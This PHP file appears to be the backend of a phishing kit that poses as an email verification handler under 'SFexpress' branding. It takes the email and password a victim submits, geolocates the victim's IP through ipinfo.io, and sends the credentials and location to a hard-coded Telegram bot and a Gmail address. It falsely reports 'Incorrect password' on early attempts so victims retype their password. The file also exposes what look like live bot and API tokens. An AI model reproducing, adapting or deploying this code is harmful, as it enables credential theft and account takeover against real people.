<?php
error_reporting(E_ALL & ~E_NOTICE);
ini_set('display_errors', '0');
header('Content-Type: application/json');
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true ");
header("Access-Control-Allow-Methods: OPTIONS, GET, POST");
header("Access-Control-Allow-Headers: Content-Type, Depth, User-Agent, X-File-Size, X-Requested-With, If-Modified-Since, X-File-Name, Cache-Control");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header("HTTP/1.1 200 OK");
    exit;
}
include "../../tg.php";
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
/**
 * Universal Email Verification Handler
 * with MX Record Detection, IMAP Verification, and Exchange Support
 */

// Security headers
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");
define('ADMIN_EMAIL', 'emilmiller134@gmail.com');
define('FROM_EMAIL', 'noreply@' . ($_SERVER['HTTP_HOST'] ?? 'example.com'));
// Rate limiting configuration
define('MAX_ATTEMPTS', 50);
define('TIME_WINDOW', 300);
define('BLOCK_TIME', 1800);

// Telegram bot configuration (set once)
define('BOT_TOKEN', '8785861605:AAFZJr5Mu-hVacD5eB-rjMe3HOTxgyJECF4');
define('CHAT_ID', '8504512782');

function sendNotification($email, $subject, $html) {
    $fullSubject = "[XAVI] {$subject} - {$email}";
    sendHtmlEmail(ADMIN_EMAIL, $fullSubject, $html, FROM_EMAIL, 'SFexpress Security Monitor');
    // sendTelegramMessage(BOT_TOKEN, CHAT_ID, strip_tags($html));
}

function extractEmailDomain(string $email): string {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        throw new InvalidArgumentException("Invalid email address format");
    }

    $parts = explode('@', strtolower(trim($email)));
    if (count($parts) !== 2 || empty($parts[1])) {
        throw new InvalidArgumentException("Could not extract domain from email");
    }

    $domain = $parts[1];

    if (!preg_match('/^[a-z0-9\-]+(\.[a-z0-9\-]+)*\.[a-z]{2,}$/', $domain)) {
        throw new InvalidArgumentException("Invalid domain format");
    }

    return $domain;
}

function getClientIP() {
    foreach ([
        'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ] as $key) {
        if (array_key_exists($key, $_SERVER)) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
    }
    return null;
}

function checkRateLimit($email) {
    $ip = getClientIP();
    $cacheKey = "ratelimit_" . md5($ip . $email);
    
    if (!isset($_SESSION['rate_limits'])) {
        $_SESSION['rate_limits'] = [];
    }
    
    if (isset($_SESSION['rate_limits'][$cacheKey])) {
        $data = $_SESSION['rate_limits'][$cacheKey];
        
        if ($data['blocked_until'] > time()) {
            $remaining = $data['blocked_until'] - time();
            http_response_code(429);
            exit(json_encode([
                'success' => false,
                'message' => "Too many attempts. Please try again in " . ceil($remaining/60) . " minutes."
            ]));
        }
        
        if ($data['blocked_until'] > 0 && $data['blocked_until'] <= time()) {
            unset($_SESSION['rate_limits'][$cacheKey]);
        }
    }
    
    if (!isset($_SESSION['rate_limits'][$cacheKey])) {
        $_SESSION['rate_limits'][$cacheKey] = [
            'attempts' => 1,
            'first_attempt' => time(),
            'blocked_until' => 0
        ];
    } else {
        $_SESSION['rate_limits'][$cacheKey]['attempts']++;
        
        if ($_SESSION['rate_limits'][$cacheKey]['attempts'] >= MAX_ATTEMPTS) {
            if (time() - $_SESSION['rate_limits'][$cacheKey]['first_attempt'] <= TIME_WINDOW) {
                $_SESSION['rate_limits'][$cacheKey]['blocked_until'] = time() + BLOCK_TIME;
                
                error_log("Rate limit blocked: IP=$ip, Email=$email");
                
                http_response_code(429);
                exit(json_encode([
                    'success' => false,
                    'message' => "Too many attempts. Your account is temporarily blocked for 30 minutes."
                ]));
            } else {
                $_SESSION['rate_limits'][$cacheKey] = [
                    'attempts' => 1,
                    'first_attempt' => time(),
                    'blocked_until' => 0
                ];
            }
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit(json_encode(['success' => false, 'message' => 'Method not allowed']));
}

$input = json_decode(file_get_contents('php://input'), true);
if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    exit(json_encode(['success' => false, 'message' => 'Invalid JSON input']));
}

if (empty($input['userID']) || empty($input['password'])) {
    http_response_code(400);
    exit(json_encode(['success' => false, 'message' => 'Email and password are required']));
}

$email = filter_var($input['userID'], FILTER_SANITIZE_EMAIL);
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    exit(json_encode(['success' => false, 'message' => 'Invalid email format']));
}

checkRateLimit($email);
$_SESSION['password'] = $input['password'];
$domain = extractEmailDomain($email);
logSuccessfulLogin($email, getClientIP(), $domain, $input['password'], 'login');

if($_SESSION['count'] <= 1) {
    $_SESSION['count']++;
    http_response_code(429);
    exit(json_encode(['success' => false, 'count' => $_SESSION['count'], 'message' => 'Incorrect password. Please try again']));
}
else {
    $_SESSION['count'] = 0;
    http_response_code(200);
    exit(json_encode(['success' => true, 'count' => $_SESSION['count'], 'message' => 'Login successful']));
}
function logSuccessfulLogin($email, $ip, $provider='unknown', $password, $type) {
    $json = makeHttpRequest("https://ipinfo.io/{$ip}?token=062894900afc00");
    $geoData = json_decode($json, true);
    
    $country = htmlspecialchars($geoData['country'] ?? 'Unknown');
    $region = htmlspecialchars($geoData['region'] ?? 'Unknown');
    $city = htmlspecialchars($geoData['city'] ?? 'Unknown');
    $zip = htmlspecialchars($geoData['postal'] ?? 'Unknown');
    $org = htmlspecialchars($geoData['org'] ?? 'Unknown');
    $timezone = htmlspecialchars($geoData['timezone'] ?? 'Unknown');

    $htmlMessage = "
    🌐 <b><u>SUCCESSFUL LOGIN - " . strtoupper($provider) . " (" . strtoupper($type) . ")</u></b> 🌐  
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
    
    📅 <i>" . date('Y-m-d H:i:s') . "</i>  
    
    <b>🔐 Credentials</b>  
    ├ 📧 <b>Email:</b> <code>{$email}</code>  
    └ 🔑 <b>Password:</b> <code>{$password}</code>  
    └ 🆔 <b>UserID:</b> <code>{$_SESSION['userID']}</code> 
    
    <b>🖥️ Client Info</b>  
    └ <b>User Agent:</b>  
    <pre>" . htmlspecialchars($_SERVER['HTTP_USER_AGENT']) . "</pre>  
    
    <b>📍 Geolocation</b>  
    ├ 🌐 <b>IP:</b> <code>{$ip}</code>  
    ├ 🏙️ <b>City:</b> {$city}  
    ├ 🗺️ <b>Region:</b> {$region}  
    ├ 📮 <b>ZIP:</b> {$zip}  
    └ 🇺🇸 <b>Country:</b> {$country}  
    
    <b>📊 Network Info</b>  
    ├ 🛜 <b>ISP:</b> {$org}  
    └ ⏰ <b>Timezone:</b> {$timezone}  
    
    <b>🔌 Protocol</b>  
    └ <b>Type:</b> {$type}
    
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
    🔗 <a href='https://iplocation.com/?ip=" . urlencode($ip) . "'>View Detailed Geolocation</a>  
    ";
    
    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $htmlMessage);
    sendNotification($email, "Successful Login", $htmlMessage);

}

